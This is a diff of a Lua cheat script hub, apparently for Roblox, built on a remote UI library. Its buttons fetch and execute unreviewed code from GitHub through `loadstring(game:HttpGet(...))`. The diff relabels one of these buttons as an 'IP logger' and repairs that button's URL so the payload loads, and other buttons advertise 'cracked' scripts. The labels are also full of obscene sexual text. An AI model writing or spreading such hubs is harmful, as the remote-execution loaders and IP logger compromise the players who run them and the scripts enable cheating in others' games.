@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Fuzki-UI-Library/main/FuzkiLibrary.lua"))()
-local Main = Library:Create("PopItBlox SCRIPT HUB", "kode#0001, Pep#2229")
+local Main = Library:Create("SHITTY SCRIPT ZONE", "kode#0001, Pep#2229")
 -- unProtected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk' 
 
 local Other = Main:CreateSection("sex Zone")
@@ -7,8 +7,8 @@ local Preview = Main:CreateSection("Crack Zone")
 
 Preview:CreateLabel("Scripts")
 
-Other:CreateLabel("Only POP IT TRADING Supported")
-Other:CreateLabel("This Script Made By lol pep#2229 hid your name")
+Other:CreateLabel("THIS SCRIPT IS JUST SHIT")
+Other:CreateLabel("lol pep#2229 hid your name")
 Other:CreateLabel("Powered By CHOP DICK PLOX 6.9")
 Other:CreateLabel("Discord: https://discord.gg/pornhub")
 
@@ -20,8 +20,8 @@ Preview:CreateButton("Open", "Pop It Trading Sex Place GUI", function()
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/RTHRTHTH3R34/POP-IT-TRADING-GO/main/README.md"), true))() 
 end)
 
-Preview:CreateButton("Open", "Shitousa V0.6 Script GUI", function()
-loadstring(game:HttpGet("loadstring(game:httpget(('https://github.com/darckgames/darckscriptmain/README.md%27),true))() 
+Preview:CreateButton("Open", "Shitousa V0.6 IP logger (creator couldnt put raw.github..)", function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/darckgames/darckscriptmain/README.md'),true))() 
 end)
 
 Preview:CreateButton("Open", "THE_ANIMEGIRLSEXER69 Cracked Script GUI", function()
